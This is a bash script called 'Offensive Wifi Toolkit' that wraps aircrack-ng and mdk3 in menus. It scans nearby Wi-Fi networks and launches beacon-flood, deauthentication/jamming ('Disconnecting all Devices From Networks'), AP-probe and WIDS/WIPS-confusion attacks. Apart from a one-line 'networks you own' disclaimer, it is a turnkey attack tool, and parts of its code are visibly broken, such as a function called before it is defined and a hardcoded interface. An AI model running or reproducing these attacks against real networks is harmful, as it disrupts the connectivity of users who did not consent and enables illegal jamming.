#!/bin/bash
#Offensive Wifi Toolkit (owt)
#Project start date (Feb. 8 2021)
#Created By Brennan Mccown (clu3bot)
#Version 1.1.0
#GPL v3.0 License
#

#colors vars
LBLUE='\033[1;34m'
LRED='\033[1;31m'
LGREEN='\033[1;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NONE='\033[0m'
#

#predifined vars
S=1000
mon=Monitor
man=Managed
version="1.0.0"
language="English"
user="clu3bot"
github="https://github.com/clu3bot/"
filename="OWT"
creator="Brennan Mccown (clu3bot)"
contactinfo="brennanmccown@protonmail.com"
#
clear
#
ewr() {
    sleep 0.05
    echo -e "$@"
}

#prints intro 1
echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░ 
░███      ░███ ░███   ░███   ░███     ░███    
░███      ░███ ░░███  █████  ███      ░███    
░░███     ███   ░░░█████░█████░       ░███    
 ░░░███████░      ░░███ ░░███         █████   
   ░░░░░░░         ░░░   ░░░         ░░░░░ "  

echo -e "${YELLOW} \n         Offensive Wifi Toolkit (${filename})"
echo -e "${LBLUE}\n     Created by ${creator}"
echo -e "${LBLUE}                 Version ${version}${NONE}"
echo -e "${YELLOW}\n                     ...${NONE} "
#Sleeps for 2 seconds
sleep 2
clear
#
#print intro 2
ewr  "${LRED}Welcome To Offensive Wifi Toolkit${NONE}\n"
ewr  "${LGREEN}*********************************************${NONE}"
ewr  "${YELLOW}These tools are meant for use on networks you own\nHack at your own risk\n${NONE}"
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done
mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
ewr "[${LRED}Interface${NONE}] ${LBLUE}${iwdev}${NONE}"
dn=$(lsb_release -is)
ewr "[${LRED}Distribution${NONE}] ${LBLUE}${dn}${NONE}"
ewr "${LGREEN}*********************************************${NONE}"
ewr "${LBLUE}Check if all necessary packages are installed${NONE}"
read -p "Press Enter to Continue.."

#
clear

#checks for dependent packages
dependencies=(aircrack-ng mdk3)
for d in "${dependencies[*]}"; do
if [ $(dpkg-query -W -f='${Status}' $d 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
	echo -e "${LBLUE}The following packages must be installed for the script to run...\n${LRED}${d}\n${LBLUE}Would you like to install them now? (Y/N)"
read -p  r
if [[ "$r" == ["yY"]* ]]; then
	sudo apt-get install $d;
fi
fi
#checks if device is in monitor mode if not prompts the user to put device in monitor mode
clear
echo -e "${LRED}All Packages have been installed successfully${NONE}"
echo -e "${LGREEN}*********************************************${NONE}"
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done
mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        ewr "${LBLUE}This script requires $mon mode, would you like to enable it now? ${LRED}(Y/N)${NONE}"

	read -r re
fi
if [[ "$re" == ["yY"]* ]]; then
        ! sudo ifconfig wlan0 up
        echo -e "${YELLOW}wlan0 is enabled${LRED}"
        sudo airmon-ng start wlan0;
fi
done

#prints
clear
echo "Device now in ${mode} Mode"
sleep 1
mainMenu

#prints options menu

mainMenu () {
clear
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done

mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')

if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iwdev}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "\n${NONE}[${LRED}Options${NONE}]"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}General${NONE}]"
	ewr "${YELLOW}0]Exit"
	ewr "${YELLOW}1]Main Menu"
	ewr "${YELLOW}2]Put Device in Monitor Mode"
	ewr "${YELLOW}3]Put Device in Managed Mode"
	ewr "${YELLOW}4]Scan Networks"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Wifi Attacks${NONE}]"
	ewr "${YELLOW}5]Wifi Attack Menu${NONE}"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Other${NONE}]"
	ewr "${YELLOW}6]About"
	ewr "${LGREEN}*****************${NONE}"
while true; do
ewr "\n${LRED}Select an option:${NONE}"
read -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
	clear
     exit 0
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p  "Are you sure? Press Enter.."
     mainMenu
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     monitorMode
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     managedMode
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     scanNetworks
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     wifiAttacks
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     abouT
     ;;
  *) echo -e "Not an Option"
     mainMenu
     ;;
esac
done
}

#puts interface in monitor mode
monitorMode () {
clear
airmon-ng check kill
sudo airmon-ng start wlan0
clear
echo -e "${LRED}Device now in $mon Mode${NONE}"
mainMenu
}

#puts interface in managed mode
managedMode () {
clear
service network-manager start
sudo airmon-ng stop wlan0mon
clear
echo -e "${LRED}Device now in $man Mode${NONE}"
mainMenu
}

#scans for networks in the area then lists them
scanNetworks () {
clear
for dev in /sys/class/net/*; do
	if [ -e "$dev"/wireless ]; then
	iwdev=${dev##*/};
     break;
     fi
done
	mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
	Mod=Monitor
else
	Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
	sleep 0.1
else
	echo -e "${LRED}This tool requires Monitor Mode${NONE}"
	read -p "Press Enter to continue to Main Menu"
		mainMenu
fi
	echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
	
		trap "airmon-ng stop wlan0mon > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
		xterm -e airodump-ng --output-format csv -w otp wlan0mon > /dev/null & sleep 10 ; kill $!
	sed -i '1d' otp-01.csv
kill %1
	echo -e "\n\n${LRED}Scan Results${NONE}"
	cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
		while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do 
	echo -e "\n${LBLUE}Select a Network"
	read -p "$(tput setaf 7) " S
done
		nn=`sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 `
	rm -rf otp-01.csv 2> /dev/null
	echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
	read -p "$(tput setaf 7)Press Enter to Continue.."
clear
	mainMenu
}


#about page menu
abouT () {
clear

	ewr "${LRED}About${NONE}"
	ewr "${LGREEN}********************************${NONE}"
	ewr "${YELLOW}Creator${NONE}:${YELLOW}$creator${NONE}"
	ewr "${YELLOW}Github${NONE}:${YELLOW}$github${NONE}"
	ewr "${YELLOW}Language${NONE}:${YELLOW}$language${NONE}"
	ewr "${YELLOW}Version${NONE}:${YELLOW} $version${NONE}"
	ewr "${YELLOW}Filename${NONE}:${YELLOW}$filename${NONE}"
	ewr "${YELLOW}Contact${NONE}:${YELLOW}$contactinfo${NONE}"
	ewr "${LGREEN}********************************${NONE}"
	ewr "${LRED}Press 1 for Main Menu${NONE}"
}

#wifi attacks menu
wifiAttacks () {
clear

	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iwdev}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}General${NONE}]"
	ewr "${YELLOW}0]Main Menu"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Wifi Attacks${NONE}]"
	ewr "${YELLOW}1]Beacon Flood Attack"
	ewr "${YELLOW}2]Deauth/Jamming Attack"
	ewr "${YELLOW}3]Basic AP Probe"
	ewr "${YELLOW}4]WIDS/WIPS Confusion Attack"
	ewr "${LGREEN}*****************${NONE}"
while true; do
echo -e "${LRED}Select an option:${NONE}"
read -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     mainMenu
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p  "Are you sure? Press Enter.."
     beacoN
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     deautH
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     probE
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     confusioN
     ;;
  *) echo -e "Not an Option"
     wifiAttacks
     ;;
esac
done
}

#beacon flood attack using mdk3
beacoN () {
clear
checkMode1
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Beacon Flood Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
mdk3 $iwdev b -s 250
}

#airplay deauth attack using mdk3
deautH () {
clear
checkMode1
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
mdk3 $iwdev d -c
}

#wids/wips confusion attack using mdk3
confusioN () {
clear
checkMode1
checknN
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}WIDS/WIPS Confusion Commencing.."
mdk3 $iwdev w -c -z -t $nn
}

#probe using mdk3
probE () {
clear
checkMode1
checknN
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
mdk3 wlan0mon p -e $nn
}

#checks if interface is in monitor mode for variable assignment
checkMode () {
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done
mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
}

#checks if interface is in monitor or managed mode /// for tools that require monitor
checkMode1 () {
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done
mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
sleep 0.1
else
echo -e "${LRED}This tool requires Monitor Mode${NONE}"
read -p "Press Enter to continue to Main Menu"
mainMenu
fi
}

#checks if the network name is assigned
checknN () {
if [ -n "$nn" ]; then
sleep 0.1
else
echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"

read -r ra
fi
if [[ "$ra" == ["yY"]* ]]; then
        scanNetworkFornN
sleep 0.5
else
clear
echo "Returning to Main Menu.."
sleep 0.8
mainMenu
fi
}

#scan networks specifically for probe and wids/wips confusion
scanNetworkFornN () {
clear
for dev in /sys/class/net/*; do
        if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
     break;
     fi
done
        mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
        Mod=Monitor
else
        Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -p "Press Enter to continue to Main Menu"
                mainMenu
fi
        echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
        
                trap "airmon-ng stop wlan0mon > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
                xterm -e airodump-ng --output-format csv -w otp wlan0mon > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do 
        echo -e "\n${LBLUE}Select a Network"
        read -p "$(tput setaf 7) " S
done
                nn=`sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 `
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -p "$(tput setaf 7)Press Enter to Continue.."
clear
}

#stops or keeps monitor mode on termination

terminatioN () {
for dev in /sys/class/net/*; do
    if [ -e "$dev"/wireless ]; then
        iwdev=${dev##*/};
        break;
    fi
done
mode=$(iwconfig "$iwdev" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Managed" ]; then
exit
else
clear
echo -e "${LBLUE}Exiting OWT, would you like to remain in Monitor Mode? ${LRED}(Y/N)${NONE}"
read -r ro
fi
if [[ "$ro" == ["yY"]* ]]; then
exit
else
airmon-ng stop $iwdev
exit
fi
}

trap terminatioN EXIT

#functions
OWT () {
mainMenu
monitorMode
mangedMode
scanNetworks
abouT
wifiAttacks
beacoN
deautH
confusioN
probE
checkMode
checkMode1
checknN
scanNetworknN
terminatioN
}

OWT
